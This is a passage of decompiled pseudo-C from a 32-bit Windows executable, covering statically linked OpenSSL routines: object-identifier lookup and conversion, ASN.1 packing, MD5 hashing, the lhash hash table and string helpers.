    return 0;
  }
  return result;
}
// 4234E7: variable 'v1' is possibly undefined
// 4FB9D0: using guessed type char *off_4FB9D0[2];

//----- (00423580) --------------------------------------------------------
int __cdecl sub_423580(int a1, int a2, int a3, int a4, int (__cdecl *a5)(int, int), char a6)
{
  int v6; // ebp
  int v7; // esi
  int v8; // edi
  int v10; // ebx
  int v11; // eax
  int v12; // edi

  v6 = a3;
  v7 = 0;
  v8 = 0;
  if ( !a3 )
    return 0;
  v10 = 0;
  if ( a3 <= 0 )
    goto LABEL_12;
  do
  {
    v7 = (v10 + v6) / 2;
    v8 = a2 + a4 * v7;
    v11 = a5(a1, v8);
    if ( v11 >= 0 )
    {
      if ( v11 <= 0 )
        break;
      v10 = v7 + 1;
    }
    else
    {
      v6 = (v10 + v6) / 2;
    }
  }
  while ( v10 < v6 );
  if ( v11 )
  {
    if ( (a6 & 1) == 0 )
      return 0;
  }
  else
  {
LABEL_12:
    if ( (a6 & 2) != 0 )
    {
      if ( v7 > 0 )
      {
        v12 = a2 + a4 * (v7 - 1);
        do
        {
          if ( a5(a1, v12) )
            break;
          --v7;
          v12 -= a4;
        }
        while ( v7 > 0 );
      }
      return a2 + a4 * v7;
    }
  }
  return v8;
}

//----- (00423630) --------------------------------------------------------
int __cdecl sub_423630(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
    return *(_DWORD *)(a1 + 12);
  return result;
}

//----- (00423640) --------------------------------------------------------
int __cdecl sub_423640(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
    return *(_DWORD *)(a1 + 16);
  return result;
}

//----- (00423650) --------------------------------------------------------
int __cdecl sub_423650(int a1, int a2, int a3, int a4, int (__cdecl *a5)(int, int))
{
  return sub_423580(a1, a2, a3, a4, a5, 0);
}

//----- (00423680) --------------------------------------------------------
int __cdecl sub_423680(int a1)
{
  int v1; // edi
  int result; // eax
  _DWORD *v3; // eax
  int v4; // ebx
  int v5; // esi
  _DWORD *v6; // ebp
  int v7; // eax
  int v8[2]; // [esp+4h] [ebp-8h] BYREF

  v1 = 0;
  if ( !a1 )
    return 0;
  result = *(_DWORD *)(a1 + 8);
  if ( !result )
  {
    if ( !*(_DWORD *)(a1 + 12) )
      return 0;
    if ( stru_538F78.RecursionCount
      && (v8[1] = a1, v8[0] = 0, (v3 = sub_424780(stru_538F78.RecursionCount, (int)v8)) != 0) )
    {
      return *(_DWORD *)(v3[1] + 8);
    }
    else
    {
      v4 = 956;
      do
      {
        v5 = (v4 + v1) / 2;
        v6 = (_DWORD *)((char *)&unk_503E28 + 4 * v5);
        v7 = sub_4234E0((int)&a1);
        if ( v7 >= 0 )
        {
          if ( v7 <= 0 )
            break;
          v1 = v5 + 1;
        }
        else
        {
          v4 = (v4 + v1) / 2;
        }
      }
      while ( v1 < v4 );
      if ( !v7 && v6 )
        return dword_4FB9D8[6 * *v6];
      else
        return 0;
    }
  }
  return result;
}
// 4FB9D8: using guessed type int dword_4FB9D8[];

//----- (00423740) --------------------------------------------------------
unsigned int __cdecl sub_423740(char *a1, signed int a2, int a3, int a4)
{
  char *v4; // ebp
  int v5; // eax
  unsigned int v6; // ebx
  char *v7; // edi
  unsigned int v9; // esi
  int v10; // edi
  char v11; // bl
  bool v12; // zf
  int *v13; // ebx
  int *v14; // eax
  unsigned int v15; // ebx
  const char *v16; // eax
  char *v17; // edi
  char v18; // cl
  signed int v19; // esi
  signed int v20; // ebx
  signed int v21; // kr00_4
  int *Block; // [esp+8h] [ebp-38h]
  signed int v23; // [esp+Ch] [ebp-34h]
  int v24; // [esp+10h] [ebp-30h]
  int v25; // [esp+14h] [ebp-2Ch]
  int v26; // [esp+18h] [ebp-28h]
  char *v27; // [esp+1Ch] [ebp-24h]
  char v28[28]; // [esp+20h] [ebp-20h] BYREF

  v4 = a1;
  v23 = a2;
  v24 = 0;
  if ( a1 && a2 > 0 )
    *a1 = 0;
  if ( !a3 || !*(_DWORD *)(a3 + 16) )
    return 0;
  if ( a4 || (v5 = sub_423680(a3), (v6 = v5) == 0) || (v7 = sub_423440(v5)) == 0 && (v7 = sub_4233A0(v6)) == 0 )
  {
    v25 = *(_DWORD *)(a3 + 12);
    v27 = *(char **)(a3 + 16);
    v26 = 1;
    Block = 0;
    if ( v25 <= 0 )
      goto LABEL_61;
    while ( 1 )
    {
      v9 = 0;
      v10 = 0;
      while ( 1 )
      {
        v11 = *v27;
        v12 = v25-- == 1;
        ++v27;
        if ( v12 && v11 < 0 )
          goto LABEL_19;
        if ( v10 )
        {
          if ( !sub_437FD0(Block, v11 & 0x7F) )
            goto LABEL_19;
        }
        else
        {
          v9 |= v11 & 0x7F;
        }
        if ( v11 >= 0 )
          break;
        if ( v10 )
        {
          v13 = Block;
          goto LABEL_31;
        }
        if ( v9 <= 0x1FFFFFF )
        {
          v9 <<= 7;
        }
        else
        {
          v13 = Block;
          if ( !Block )
          {
            v14 = sub_4168C0();
            Block = v14;
            if ( !v14 )
              goto LABEL_19;
            v13 = v14;
          }
          if ( !sub_417490(v13, v9) )
            goto LABEL_20;
          v10 = 1;
LABEL_31:
          if ( !sub_437C10(v13, v13, 7) )
            goto LABEL_20;
        }
      }
      if ( v26 )
      {
        v26 = 0;
        if ( v9 < 0x50 )
        {
          v15 = v9 / 0x28;
          v9 %= 0x28u;
        }
        else
        {
          LOBYTE(v15) = 2;
          if ( v10 )
          {
            if ( sub_438090(Block, 0x50u) )
              goto LABEL_41;
LABEL_19:
            v13 = Block;
LABEL_20:
            sub_417060((void **)v13);
            return -1;
          }
          v9 -= 80;
        }
LABEL_41:
        if ( v4 && v23 > 1 )
        {
          *v4++ = v15 + 48;
          --v23;
          *v4 = 0;
        }
        ++v24;
      }
      if ( v10 )
      {
        v16 = sub_43A050(Block);
        v17 = (char *)v16;
        if ( !v16 )
          goto LABEL_19;
        v19 = strlen(v16);
        if ( v4 )
        {
          v20 = v23;
          if ( v23 > 1 )
          {
            *v4++ = 46;
            *v4 = v18;
            v20 = v23 - 1;
          }
          sub_424880(v4, v17, v20);
          if ( v19 <= v20 )
          {
            v4 += v19;
            v23 = v20 - v19;
          }
          else
          {
            v4 += v20;
            v23 = 0;
          }
        }
        v24 += v19 + 1;
        sub_413490(v17);
      }
      else
      {
        sub_4191B0((int)v28, 26, ".%lu", v9);
        v21 = strlen(v28);
        if ( v4 && v23 > 0 )
        {
          sub_424880(v4, v28, v23);
          if ( v21 <= v23 )
          {
            v4 += v21;
            v23 -= v21;
          }
          else
          {
            v4 += v23;
            v23 = 0;
          }
        }
        v24 += v21;
      }
      if ( v25 <= 0 )
      {
LABEL_61:
        sub_417060((void **)Block);
        return v24;
      }
    }
  }
  if ( a1 )
    sub_424880(a1, v7, a2);
  return strlen(v7);
}
// 42398D: variable 'v18' is possibly undefined

//----- (00423A80) --------------------------------------------------------
int __cdecl sub_423A80(const char *a1)
{
  _DWORD *v1; // eax
  int v3; // ecx
  int v4; // ebp
  int v5; // esi
  int *v6; // edi
  int v7; // eax
  int v8[2]; // [esp+0h] [ebp-20h] BYREF
  char v9; // [esp+8h] [ebp-18h] BYREF
  const char *v10; // [esp+Ch] [ebp-14h]
  int v11; // [esp+24h] [ebp+4h]

  v10 = a1;
  if ( stru_538F78.RecursionCount )
  {
    v8[0] = 2;
    v8[1] = (int)&v9;
    v1 = sub_424780(stru_538F78.RecursionCount, (int)v8);
    if ( v1 )
      return *(_DWORD *)(v1[1] + 8);
  }
  v3 = 1052;
  v4 = 0;
  v11 = 1052;
  do
  {
    v5 = (v3 + v4) / 2;
    v6 = &dword_502DB8[v5];
    v7 = strcmp(v10, (&off_4FB9D4)[6 * *v6]);
    if ( v7 >= 0 )
    {
      if ( v7 <= 0 )
        break;
      v4 = v5 + 1;
    }
    else
    {
      v11 = v5;
    }
    v3 = v11;
  }
  while ( v4 < v11 );
  if ( !v7 && v6 )
    return dword_4FB9D8[6 * *v6];
  else
    return 0;
}
// 4FB9D4: using guessed type char *off_4FB9D4;
// 4FB9D8: using guessed type int dword_4FB9D8[];
// 502DB8: using guessed type int dword_502DB8[1052];

//----- (00423B70) --------------------------------------------------------
int __cdecl sub_423B70(const char *a1)
{
  _DWORD *v1; // eax
  int v3; // ecx
  int v4; // ebp
  int v5; // esi
  int *v6; // edi
  int v7; // eax
  int v8[2]; // [esp+0h] [ebp-20h] BYREF
  const char *v9; // [esp+8h] [ebp-18h] BYREF
  int v10; // [esp+24h] [ebp+4h]

  v9 = a1;
  if ( stru_538F78.RecursionCount )
  {
    v8[0] = 1;
    v8[1] = (int)&v9;
    v1 = sub_424780(stru_538F78.RecursionCount, (int)v8);
    if ( v1 )
      return *(_DWORD *)(v1[1] + 8);
  }
  v3 = 1052;
  v4 = 0;
  v10 = 1052;
  do
  {
    v5 = (v3 + v4) / 2;
    v6 = &dword_501D48[v5];
    v7 = strcmp(v9, off_4FB9D0[6 * *v6]);
    if ( v7 >= 0 )
    {
      if ( v7 <= 0 )
        break;
      v4 = v5 + 1;
    }
    else
    {
      v10 = v5;
    }
    v3 = v10;
  }
  while ( v4 < v10 );
  if ( !v7 && v6 )
    return dword_4FB9D8[6 * *v6];
  else
    return 0;
}
// 4FB9D0: using guessed type char *off_4FB9D0[2];
// 4FB9D8: using guessed type int dword_4FB9D8[];
// 501D48: using guessed type int dword_501D48[1052];

//----- (00423C60) --------------------------------------------------------
char **__cdecl sub_423C60(char *a1, int a2)
{
  int v2; // eax
  char **result; // eax
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ebx
  char **v8; // esi
  void **v9; // edi
  char **v10; // [esp+4h] [ebp-4h] BYREF

  if ( !a2 )
  {
    v2 = sub_423B70(a1);
    if ( v2 )
      return sub_423310(v2);
    v2 = sub_423A80(a1);
    if ( v2 )
      return sub_423310(v2);
  }
  v4 = sub_422620(0, 0, a1, 0xFFFFFFFF);
  v5 = v4;
  if ( v4 <= 0 )
    return 0;
  v6 = sub_4328B0(0, v4, 6);
  v7 = v6;
  if ( v6 < 0 )
    return 0;
  result = (char **)sub_4133F0(v6);
  v8 = result;
  if ( result )
  {
    a2 = (int)result;
    sub_432CA0((_BYTE **)&a2, 0, v5, 6, 0);
    sub_422620(a2, v5, a1, 0xFFFFFFFF);
    v10 = v8;
    v9 = sub_422DD0(0, &v10, v7);
    sub_413490(v8);
    return (char **)v9;
  }
  return result;
}

//----- (00423D50) --------------------------------------------------------
void *__cdecl sub_423D50(char *a1, const char *a2, const char *a3)
{
  char **v3; // esi
  int v5; // ecx
  void *v6; // edi

  if ( sub_423B70(a2) || sub_423A80(a3) )
  {
    sub_408310(8, 100, 102, (int)"crypto\\objects\\obj_dat.c", 689);
    return 0;
  }
  else
  {
    v3 = sub_423C60(a1, 1);
    if ( sub_423680((int)v3) )
    {
      sub_408310(8, 100, 102, (int)"crypto\\objects\\obj_dat.c", 698);
      sub_422B70((void **)v3);
      return 0;
    }
    else
    {
      v5 = dword_531314++;
      v3[2] = (char *)v5;
      *v3 = (char *)a2;
      v3[1] = (char *)a3;
      v6 = sub_423180((int)v3);
      *v3 = 0;
      v3[1] = 0;
      sub_422B70((void **)v3);
      return v6;
    }
  }
}
// 531314: using guessed type int dword_531314;

//----- (00423E20) --------------------------------------------------------
int __cdecl sub_423E20(_DWORD *a1)
{
  if ( a1[1] || *a1 == 5 )
    return *a1;
  else
    return 0;
}

//----- (00423E40) --------------------------------------------------------
_DWORD *__cdecl sub_423E40(_DWORD *a1, int a2, int a3)
{
  int v3; // eax
  _DWORD *result; // eax

  if ( a1[1] )
    sub_42FB60(&a1, 0);
  v3 = a2;
  *a1 = a2;
  if ( v3 == 1 )
  {
    result = (_DWORD *)(unsigned __int8)-(a3 != 0);
    a1[1] = result;
  }
  else
  {
    result = a1;
    a1[1] = a3;
  }
  return result;
}

//----- (00423E90) --------------------------------------------------------
int __cdecl sub_423E90(int *a1, int a2, int *a3)
{
  int *v3; // esi
  void **v4; // eax
  int result; // eax
  void **v6; // eax

  v3 = a3;
  if ( !a3 || a2 == 1 )
  {
    a3 = a1;
    if ( a1[1] )
      sub_42FB60(&a3, 0);
    *a3 = a2;
    if ( a2 == 1 )
    {
      result = 1;
      a3[1] = (unsigned __int8)-(v3 != 0);
    }
    else
    {
      a3[1] = (int)v3;
      return 1;
    }
  }
  else if ( a2 == 6 )
  {
    v4 = sub_439EE0((int)a3);
    if ( !v4 )
      return 0;
    sub_423E40(a1, 6, (int)v4);
    return 1;
  }
  else
  {
    v6 = sub_432E00((int)a3);
    if ( !v6 )
      return 0;
    sub_423E40(a1, a2, (int)v6);
    return 1;
  }
  return result;
}

//----- (00423F50) --------------------------------------------------------
void **__cdecl sub_423F50(int a1, int a2, int *a3)
{
  void **result; // eax
  void **v4; // ebx
  int *v5; // esi
  int v6; // eax
  int *v7; // [esp+4h] [ebp-4h] BYREF

  result = sub_43A6D0(a2, a1, 0);
  v4 = result;
  if ( result )
  {
    if ( !a3 || (v5 = (int *)*a3) == 0 )
    {
      v6 = sub_42C600();
      v5 = (int *)v6;
      if ( !v6 )
      {
        sub_42C4F0(v4);
        return 0;
      }
      if ( a3 )
        *a3 = v6;
    }
    v7 = v5;
    if ( v5[1] )
      sub_42FB60(&v7, 0);
    *v7 = 16;
    result = (void **)v5;
    v7[1] = (int)v4;
  }
  return result;
}

//----- (00423FE0) --------------------------------------------------------
int __cdecl sub_423FE0(int *a1, int *a2)
{
  int *v2; // eax
  int v3; // eax
  int result; // eax

  if ( !a2 )
    return 0;
  if ( *a2 != 16 )
    return 0;
  v2 = (int *)a2[1];
  if ( !v2 )
    return 0;
  a2 = a1;
  a1 = v2;
  v3 = *v2;
  a1 = (int *)a1[2];
  result = sub_42E9C0(0, (void **)&a1, v3, (int)a2);
  if ( !result )
  {
    sub_408310(13, 199, 110, (int)"crypto\\asn1\\asn_pack.c", 60);
    return 0;
  }
  return result;
}

//----- (00424010) --------------------------------------------------------
int __cdecl sub_424010(int *a1, char *Src, size_t Size)
{
  size_t v3; // edi
  char *v4; // ebp
  unsigned int v5; // eax
  unsigned int v6; // ecx
  int v7; // eax
  int *v8; // ebp
  int v10; // ebx
  size_t v11; // ebx

  v3 = Size;
  v4 = Src;
  if ( Size )
  {
    v5 = a1[4];
    v6 = v5 + 8 * Size;
    if ( v6 < v5 )
      ++a1[5];
    a1[5] += Size >> 29;
    v7 = a1[22];
    a1[4] = v6;
    if ( v7 )
    {
      v8 = a1 + 6;
      if ( Size < 0x40 && v7 + Size < 0x40 )
      {
        memcpy((char *)v8 + v7, Src, Size);
        a1[22] += Size;
        return 1;
      }
      v10 = 64 - v7;
      memcpy((char *)v8 + v7, Src, 64 - v7);
      sub_43A800(a1, a1 + 6, 1);
      v3 = Size - v10;
      a1[22] = 0;
      memset(a1 + 6, 0, 0x40u);
      v4 = &Src[v10];
    }
    if ( v3 >> 6 )
    {
      sub_43A800(a1, v4, v3 >> 6);
      v11 = v3 >> 6 << 6;
      v4 += v11;
      v3 -= v11;
    }
    if ( v3 )
    {
      a1[22] = v3;
      memcpy(a1 + 6, v4, v3);
    }
  }
  return 1;
}

//----- (004240F0) --------------------------------------------------------
int __cdecl sub_4240F0(int a1, int a2)
{
  int v2; // ebx
  _DWORD *v3; // esi
  unsigned int v4; // ebx
  int v5; // ecx

  v2 = *(_DWORD *)(a2 + 88);
  v3 = (_DWORD *)(a2 + 24);
  *(_BYTE *)(v2 + a2 + 24) = 0x80;
  v4 = v2 + 1;
  if ( v4 > 0x38 )
  {
    memset((char *)v3 + v4, 0, 64 - v4);
    v4 = 0;
    sub_43A800((int *)a2, v3, 1);
  }
  memset((char *)v3 + v4, 0, 56 - v4);
  *(_BYTE *)(a2 + 80) = *(_BYTE *)(a2 + 16);
  *(_BYTE *)(a2 + 81) = *(_BYTE *)(a2 + 17);
  *(_BYTE *)(a2 + 82) = *(_BYTE *)(a2 + 18);
  *(_BYTE *)(a2 + 83) = *(_BYTE *)(a2 + 19);
  *(_BYTE *)(a2 + 84) = *(_BYTE *)(a2 + 20);
  *(_BYTE *)(a2 + 85) = *(_BYTE *)(a2 + 21);
  *(_BYTE *)(a2 + 86) = *(_BYTE *)(a2 + 22);
  *(_BYTE *)(a2 + 87) = *(_BYTE *)(a2 + 23);
  sub_43A800((int *)a2, (_DWORD *)(a2 + 24), 1);
  *(_DWORD *)(a2 + 88) = 0;
  sub_4139E0((_BYTE *)(a2 + 24), 0x40u);
  v5 = *(_DWORD *)a2;
  *(_WORD *)a1 = *(_DWORD *)a2;
  *(_BYTE *)(a1 + 2) = BYTE2(v5);
  *(_BYTE *)(a1 + 3) = HIBYTE(v5);
  *(_DWORD *)(a1 + 4) = *(_DWORD *)(a2 + 4);
  *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
  *(_DWORD *)(a1 + 12) = *(_DWORD *)(a2 + 12);
  return 1;
}

//----- (00424220) --------------------------------------------------------
int __cdecl sub_424220(_DWORD *a1)
{
  memset(a1, 0, 0x5Cu);
  *a1 = 1732584193;
  a1[1] = -271733879;
  a1[2] = -1732584194;
  a1[3] = 271733878;
  return 1;
}

//----- (00424260) --------------------------------------------------------
void __cdecl sub_424260(void **Block)
{
  unsigned int v1; // edi
  _DWORD *v2; // eax
  _DWORD *v3; // esi

  if ( Block )
  {
    v1 = 0;
    if ( Block[3] )
    {
      do
      {
        v2 = (_DWORD *)*((_DWORD *)*Block + v1);
        if ( v2 )
        {
          do
          {
            v3 = (_DWORD *)v2[1];
            sub_413490(v2);
            v2 = v3;
          }
          while ( v3 );
        }
        ++v1;
      }
      while ( v1 < (unsigned int)Block[3] );
    }
    sub_413490(*Block);
    sub_413490(Block);
  }
}

//----- (004242D0) --------------------------------------------------------
void __usercall sub_4242D0(
        int a1@<ebx>,
        _DWORD *a2,
        void (__cdecl *a3)(_DWORD),
        void (__cdecl *a4)(_DWORD, int),
        int a5)
{
  int i; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // esi

  if ( a2 )
  {
    for ( i = a2[3] - 1; i >= 0; --i )
    {
      v6 = *(_DWORD **)(*a2 + 4 * i);
      if ( v6 )
      {
        do
        {
          v7 = (_DWORD *)v6[1];
          if ( a1 )
            a4(*v6, a5);
          else
            a3(*v6);
          v6 = v7;
        }
        while ( v7 );
      }
    }
  }
}

//----- (00424330) --------------------------------------------------------
void __cdecl sub_424330(_DWORD *a1, void (__cdecl *a2)(_DWORD))
{
  int i; // edi
  _DWORD *v3; // eax
  _DWORD *v4; // esi

  if ( a1 )
  {
    for ( i = a1[3] - 1; i >= 0; --i )
    {
      v3 = *(_DWORD **)(*a1 + 4 * i);
      if ( v3 )
      {
        do
        {
          v4 = (_DWORD *)v3[1];
          a2(*v3);
          v3 = v4;
        }
        while ( v4 );
      }
    }
  }
}

//----- (00424370) --------------------------------------------------------
void __cdecl sub_424370(_DWORD *a1, void (__cdecl *a2)(_DWORD, int), int a3)
{
  sub_4242D0(1, a1, 0, a2, a3);
}

//----- (004243A0) --------------------------------------------------------
int __usercall sub_4243A0@<eax>(int a1@<esi>)
{
  int v1; // ecx
  int v2; // ebx
  _DWORD *v3; // ebp
  int v4; // edi
  int v5; // ecx
  unsigned int v6; // ebx
  char *v7; // edx
  unsigned int v9; // eax
  int v10; // ecx
  unsigned int i; // [esp+Ch] [ebp-4h]

  v1 = *(_DWORD *)(a1 + 24);
  v2 = *(_DWORD *)(a1 + 20);
  ++*(_DWORD *)(a1 + 12);
  ++*(_DWORD *)(a1 + 40);
  *(_DWORD *)(a1 + 20) = v2 + 1;
  v3 = (_DWORD *)(*(_DWORD *)a1 + 4 * (v2 + v1));
  v4 = *(_DWORD *)a1 + 4 * v2;
  *v3 = 0;
  v5 = *(_DWORD *)v4;
  for ( i = *(_DWORD *)(a1 + 16); *(_DWORD *)v4; v5 = *(_DWORD *)v4 )
  {
    if ( *(_DWORD *)(v5 + 8) % i == v2 )
    {
      v4 = *(_DWORD *)v4 + 4;
    }
    else
    {
      *(_DWORD *)v4 = *(_DWORD *)(*(_DWORD *)v4 + 4);
      *(_DWORD *)(v5 + 4) = *v3;
      *v3 = v5;
    }
  }
  if ( *(_DWORD *)(a1 + 20) >= *(_DWORD *)(a1 + 24) )
  {
    v6 = 2 * *(_DWORD *)(a1 + 16);
    v7 = (char *)sub_413500(*(void **)a1, 8 * *(_DWORD *)(a1 + 16), (int)"crypto\\lhash\\lhash.c", 214);
    if ( !v7 )
    {
      ++*(_DWORD *)(a1 + 92);
      *(_DWORD *)(a1 + 20) = 0;
      return 0;
    }
    v9 = *(_DWORD *)(a1 + 16);
    if ( v9 < v6 )
      memset(&v7[4 * v9], 0, 4 * (v6 - v9));
    v10 = *(_DWORD *)(a1 + 16);
    ++*(_DWORD *)(a1 + 44);
    *(_DWORD *)(a1 + 24) = v10;
    *(_DWORD *)(a1 + 16) = v6;
    *(_DWORD *)(a1 + 20) = 0;
    *(_DWORD *)a1 = v7;
  }
  return 1;
}

//----- (00424480) --------------------------------------------------------
_DWORD *__usercall sub_424480@<eax>(int a1@<esi>)
{
  int *v1; // eax
  int v2; // ebx
  int v3; // eax
  _DWORD *result; // eax
  int v5; // ecx
  int v6; // ecx
  _DWORD *v7; // edx
  _DWORD *v8; // ecx

  v1 = (int *)(*(_DWORD *)a1 + 4 * (*(_DWORD *)(a1 + 24) + *(_DWORD *)(a1 + 20)) - 4);
  v2 = *v1;
  *v1 = 0;
  v3 = *(_DWORD *)(a1 + 20);
  if ( v3 )
  {
    *(_DWORD *)(a1 + 20) = v3 - 1;
  }
  else
  {
    result = sub_413500(*(void **)a1, 4 * *(_DWORD *)(a1 + 24), (int)"crypto\\lhash\\lhash.c", 240);
    if ( !result )
    {
      ++*(_DWORD *)(a1 + 92);
      return result;
    }
    *(_DWORD *)(a1 + 24) >>= 1;
    v5 = *(_DWORD *)(a1 + 24);
    ++*(_DWORD *)(a1 + 52);
    *(_DWORD *)(a1 + 16) >>= 1;
    *(_DWORD *)(a1 + 20) = v5 - 1;
    *(_DWORD *)a1 = result;
  }
  v6 = *(_DWORD *)(a1 + 20);
  v7 = *(_DWORD **)a1;
  --*(_DWORD *)(a1 + 12);
  ++*(_DWORD *)(a1 + 48);
  result = (_DWORD *)v7[v6];
  v8 = &v7[v6];
  if ( result )
  {
    for ( ; result[1]; result = (_DWORD *)result[1] )
      ;
    result[1] = v2;
  }
  else
  {
    *v8 = v2;
  }
  return result;
}

//----- (00424510) --------------------------------------------------------
int __usercall sub_424510@<eax>(int a1@<esi>, int a2, unsigned int *a3)
{
  unsigned int v3; // ebp
  unsigned int v4; // edx
  _DWORD *v5; // edi
  int i; // ebx
  _DWORD *v7; // eax
  int (__cdecl *v9)(_DWORD, int); // [esp+14h] [ebp+8h]

  v3 = (*(int (__cdecl **)(int))(a1 + 8))(a2);
  ++*(_DWORD *)(a1 + 56);
  *a3 = v3;
  v4 = v3 % *(_DWORD *)(a1 + 24);
  if ( v4 < *(_DWORD *)(a1 + 20) )
    v4 = v3 % *(_DWORD *)(a1 + 16);
  v9 = *(int (__cdecl **)(_DWORD, int))(a1 + 4);
  v5 = *(_DWORD **)(*(_DWORD *)a1 + 4 * v4);
  for ( i = *(_DWORD *)a1 + 4 * v4; v5; i = (int)v7 )
  {
    ++*(_DWORD *)(a1 + 88);
    if ( v5[2] == v3 )
    {
      ++*(_DWORD *)(a1 + 60);
      if ( !v9(*v5, a2) )
        break;
    }
    v7 = v5 + 1;
    v5 = (_DWORD *)v5[1];
  }
  return i;
}

//----- (00424590) --------------------------------------------------------
int __cdecl sub_424590(_BYTE *a1)
{
  _BYTE *v1; // edx
  unsigned int v2; // esi
  char v3; // al
  int v4; // edi
  unsigned int v5; // eax
  int v6; // esi
  int v7; // ecx

  v1 = a1;
  v2 = 0;
  if ( !a1 )
    return 0;
  v3 = *a1;
  if ( !*a1 )
    return 0;
  v4 = 256;
  do
  {
    v5 = v4 | v3;
    v4 += 256;
    v6 = __ROL4__(v2, (v5 ^ (v5 >> 2)) & 0xF);
    v7 = v5 * v5;
    v3 = *++v1;
    v2 = v7 ^ v6;
  }
  while ( v3 );
  return v2 ^ HIWORD(v2);
}

//----- (004245E0) --------------------------------------------------------
int __cdecl sub_4245E0(int a1)
{
  return *(_DWORD *)(a1 + 92);
}

//----- (004245F0) --------------------------------------------------------
_DWORD *__cdecl sub_4245F0(int (__cdecl *a1)(_BYTE *a1), int (__cdecl *a2)(const char *Str1, const char *Str2))
{
  _DWORD *v2; // esi
  void *v3; // eax
  int (__cdecl *v5)(const char *, const char *); // eax
  int (__cdecl *v6)(_BYTE *); // eax

  v2 = sub_413430(0x60u);
  if ( !v2 )
    return 0;
  v3 = sub_413430(0x40u);
  *v2 = v3;
  if ( !v3 )
  {
    sub_413490(v2);
    return 0;
  }
  v5 = a2;
  if ( !a2 )
    v5 = strcmp;
  v2[1] = v5;
  v6 = a1;
  if ( !a1 )
    v6 = sub_424590;
  v2[2] = v6;
  v2[3] = 8;
  v2[6] = 8;
  v2[4] = 16;
  v2[7] = 512;
  v2[8] = 256;
  return v2;
}

//----- (00424680) --------------------------------------------------------
_DWORD *__cdecl sub_424680(_DWORD *a1, int a2)
{
  _DWORD *v2; // esi
  unsigned int v3; // eax
  _DWORD *result; // eax
  _DWORD *v5; // ebx
  _DWORD *v6; // edi
  _DWORD **v7; // ecx
  _DWORD *v8; // ecx

  v2 = a1;
  v3 = (a1[9] << 8) / a1[3];
  a1[23] = 0;
  if ( v2[7] > v3 || (result = (_DWORD *)sub_4243A0((int)v2)) != 0 )
  {
    v5 = (_DWORD *)a2;
    v6 = (_DWORD *)sub_424510((int)v2, a2, (unsigned int *)&a1);
    v7 = (_DWORD **)*v6;
    if ( *v6 )
    {
      result = *v7;
      *v7 = v5;
      ++v2[17];
    }
    else
    {
      result = sub_4133F0(0xCu);
      if ( result )
      {
        v8 = a1;
        *result = v5;
        result[2] = v8;
        result[1] = 0;
        *v6 = result;
        ++v2[16];
        result = 0;
        ++v2[9];
      }
      else
      {
        ++v2[23];
      }
    }
  }
  return result;
}

//----- (00424710) --------------------------------------------------------
int __cdecl sub_424710(_DWORD *a1, int a2)
{
  _DWORD *v2; // esi
  int **v3; // eax
  int *v4; // ecx
  int v6; // edi
  unsigned int v7; // ecx
  int v8; // [esp-8h] [ebp-Ch]

  v2 = a1;
  v8 = a2;
  a1[23] = 0;
  v3 = (int **)sub_424510((int)v2, v8, (unsigned int *)&a1);
  v4 = *v3;
  if ( *v3 )
  {
    *v3 = (int *)v4[1];
    v6 = *v4;
    sub_413490(v4);
    --v2[9];
    v7 = v2[3];
    ++v2[18];
    if ( v7 > 0x10 && v2[8] >= (v2[9] << 8) / v7 )
      sub_424480((int)v2);
    return v6;
  }
  else
  {
    ++v2[19];
    return 0;
  }
}

//----- (00424780) --------------------------------------------------------
_DWORD *__cdecl sub_424780(int a1, int a2)
{
  int v2; // esi
  _DWORD *result; // eax
  int v4; // [esp-8h] [ebp-Ch]

  v2 = a1;
  v4 = a2;
  *(_DWORD *)(a1 + 92) = 0;
  result = *(_DWORD **)sub_424510(v2, v4, (unsigned int *)&a1);
  if ( result )
  {
    result = (_DWORD *)*result;
    ++*(_DWORD *)(v2 + 80);
  }
  else
  {
    ++*(_DWORD *)(v2 + 84);
  }
  return result;
}

//----- (004247B0) --------------------------------------------------------
void *__cdecl sub_4247B0(const char *Src)
{
  unsigned int v2; // kr00_4
  void *v3; // eax
  void *v4; // esi

  if ( !Src )
    return 0;
  v2 = strlen(Src);
  v3 = sub_4133F0(v2 + 1);
  v4 = v3;
  if ( v3 )
    memcpy(v3, Src, v2 + 1);
  return v4;
}

//----- (00424800) --------------------------------------------------------
void *__cdecl sub_424800(void *Src, size_t Size)
{
  void *v2; // eax

  if ( !Src || Size >= 0x7FFFFFFF )
    return 0;
  v2 = sub_4133F0(Size);
  if ( !v2 )
  {
    sub_408310(15, 115, 65, (int)"crypto\\o_str.c", 69);
    return 0;
  }
  return memcpy(v2, Src, Size);
}

//----- (00424860) --------------------------------------------------------
_BYTE *__cdecl sub_424860(_BYTE *a1, int a2)
{
  int v2; // ecx
  _BYTE *i; // eax

  v2 = a2;
  for ( i = a1; v2; ++i )
  {
    --v2;
    if ( !*i )
      break;
  }
  return (_BYTE *)(i - a1);
}

//----- (00424880) --------------------------------------------------------
int __cdecl sub_424880(char *a1, const char *a2, unsigned int a3)
{
  unsigned int v3; // ecx
  int i; // edi

  v3 = a3;
  for ( i = 0; v3 > 1; ++i )
  {
    if ( !*a2 )
      break;
    *a1 = *a2;
    --v3;
    ++a1;
    ++a2;
  }
  if ( v3 )
    *a1 = 0;
  return i + strlen(a2);
}

//----- (004248C0) --------------------------------------------------------
int __cdecl sub_4248C0(char *a1, const char *a2, unsigned int a3)
{
  unsigned int v3; // eax
  int i; // ebx
  int j; // edi

  v3 = a3;
  for ( i = 0; v3; ++a1 )
  {
    if ( !*a1 )
      break;
    --v3;
    ++i;
  }
  for ( j = 0; v3 > 1; ++j )
  {
    if ( !*a2 )
      break;
    *a1 = *a2;
    --v3;
    ++a1;
    ++a2;
  }
  if ( v3 )
    *a1 = 0;
  return i + j + strlen(a2);
}

//----- (00424920) --------------------------------------------------------
int __cdecl sub_424920(char a1)
{
  int result; // eax

  switch ( a1 )
  {
    case '0':
      result = 0;
      break;
    case '1':
      result = 1;
      break;
    case '2':
      result = 2;
      break;
    case '3':
      result = 3;
      break;
    case '4':
      result = 4;
      break;
    case '5':
      result = 5;
      break;
    case '6':
      result = 6;
      break;
    case '7':
      result = 7;
      break;
    case '8':
      result = 8;
      break;
    case '9':
      result = 9;
      break;
    case 'A':
    case 'a':
      result = 10;
      break;
    case 'B':
    case 'b':
      result = 11;
      break;
    case 'C':
    case 'c':
      result = 12;
      break;
    case 'D':
    case 'd':
      result = 13;
